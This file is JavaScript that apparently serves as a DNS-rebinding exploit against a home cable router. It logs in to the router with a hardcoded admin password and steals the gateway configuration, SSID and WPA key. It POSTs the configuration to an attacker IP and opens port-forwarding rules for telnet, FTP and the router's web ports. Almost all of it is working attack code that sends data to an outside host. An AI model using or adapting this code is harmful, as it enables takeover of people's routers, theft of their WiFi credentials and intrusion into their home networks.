let attackerIp = "192.168.0.11";

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function getFormData(object) {
    const formData = new FormData();
    Object.keys(object).forEach(key => formData.append(key, object[key]));
    return new URLSearchParams(formData).toString();
}

async function getLoginPage() {
    try {
        let resp = await fetch("/login.asp");
        if (!resp.ok) {
            return Promise.reject('Not redirected yet');
        } else {
            return resp;
        }
    } catch (e) {
        return Promise.reject(e);
    }
}

async function getSettings() {
    var resp = await fetch("/goform/system/GatewaySettings.bin"); //fetch settings after login
    let url = "http://" + attackerIp + "/config";
    let text = await resp.arrayBuffer(); 

    resp = await fetch(url, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, cors, *same-origin
        cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
        redirect: "follow", // manual, *follow, error
        body: text
    });

    return await resp.json();
}

async function getForwardingPage() {
    try {
        let resp = await fetch("/RgForwarding.asp");
        if (!resp.ok) {
            return Promise.reject('Not redirected yet');
        } else {
            return resp;
        }
    } catch (e) {
        return Promise.reject(e);
    }
}

async function Login() {
    let resp = null;
    do {
        await sleep(1000); //wait for dns cache to clear
        try {
            resp = await getLoginPage();
        } catch (e) {
            console.error(e);
        }
    } while(resp == null);

    text = await resp.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(text, 'text/html');
    csrf = htmlDoc.getElementsByName('CSRFValue')[0].value;

    var data = {
        'CSRFValue': csrf,
        'loginUsername': '',
        'loginPassword': 'aDm1n$TR8r',
        'logoffUser': 1
    }
    data = getFormData(data)

    loginResponse = fetch("/goform/login", 
        {
            "credentials":"include",
            "headers": {
                "content-type":"application/x-www-form-urlencoded",
            },
            "body": data,
            "method":"POST",
            "mode":"no-cors"
        })
    return loginResponse;
}

async function PortForward(ip, port) {
    let resp = null;
    do {
        await sleep(1000); //wait for dns cache to clear
        try {
            resp = await getForwardingPage();
        } catch (e) {
            console.error(e);
        }
    } while(resp == null);

    text = await resp.text();
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(text, 'text/html');
    csrf = htmlDoc.getElementsByName('CSRFValue')[0].value;

    data = {
        CSRFValue: csrf,
        PortForwardingCreateRemove: 0,
        PortForwardSetRuleLocalIP: "0.0.0.0",
        PortForwardSetRemoteIP: "0.0.0.0",
        PortForwardGetServiceName: 0,
        PortForwardingAdd: 0,
        PortForwardingLocalIp: ip,
        PortForwardingLocalStartPort: port,
        PortForwardingLocalEndPort: port,
        PortForwardingExtIp: "0.0.0.0",
        PortForwardingExtStartPort: port,
        PortForwardingExtEndPort: port,
        PortForwardingProtocol: 4,
        PortForwardingDesc: "",
        PortForwardingEnabled: 1,
        PortForwardingApply: 2,
        PortForwardingTable: 0,
    };

    data = getFormData(data);
    await fetch('/goform/RgForwarding', {
        method: 'post',
        body: data,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        redirect: "manual" // manual, *follow, error
    });

    data = {
        CSRFValue: csrf,
        PortForwardingCreateRemove: 1,
        PortForwardingTable: 0,
    };

    data = getFormData(data);
    await fetch('/goform/RgForwarding', {
        method: 'post',
        body: data,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        redirect: "manual" // manual, *follow, error
    });
}

async function openPorts(config) {
    for(index in config['dhcp']) {
        client = config['dhcp'][index];
        if (client['mac'].startsWith('9C:B6:D0')) {
            await PortForward(client['ip'], 23);
            await PortForward(client['ip'], 21);
            await PortForward("192.168.100.1", 80);
            await PortForward("192.168.100.1", 8080);
            return client['ip'];
        }
    }
}

async function pwn() {
    var res = await Login();
    var config = await getSettings();

    ssid = config['ssid'];
    password = config['wpa_psk'];
    
    var body = document.getElementsByName('body')[0]; 
    body.innerHTML = "<p><font face='monospace'><b>Your WiFi name is:    " + ssid + "</b></font></p><p><font face='monospace'><b>And the password is: " + password + "</b></font></p>";

    var localIp = await openPorts(config);

    var data = {'local_ip': localIp};
    data = getFormData(data);

    await fetch("http://" + attackerIp + "/ok", 
    {
        "credentials":"include",
        "headers": {
            "content-type":"application/x-www-form-urlencoded",
        },
        "body": data,
        "method":"POST",
        "mode":"no-cors"
    });
    
}

pwn();